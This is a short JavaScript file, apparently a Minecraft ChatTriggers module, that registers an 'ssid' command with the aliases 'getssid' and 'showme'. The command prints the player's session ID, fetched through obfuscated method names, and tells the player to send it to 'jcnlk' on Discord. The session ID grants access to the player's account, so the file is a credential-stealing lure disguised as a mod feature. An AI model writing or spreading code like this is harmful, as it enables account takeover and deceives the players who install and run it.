import config from "../config";
import { sendMsg } from "../utils/utils";
const commandname = "'showme' "

register("command", () => {
 if (config.enableshowme) {
  sendMsg("This is your ssid!");
  sendMsg("Make sure to send it 'jcnlk' on discord!")
  sendMsg("");
  sendMsg(Client.getMinecraft().func_110432_I().func_148254_d());}
 else {
  sendMsg("Command " + commandname + "is not enabled")}
}).setName("ssid").setAliases(["getssid", "showme"])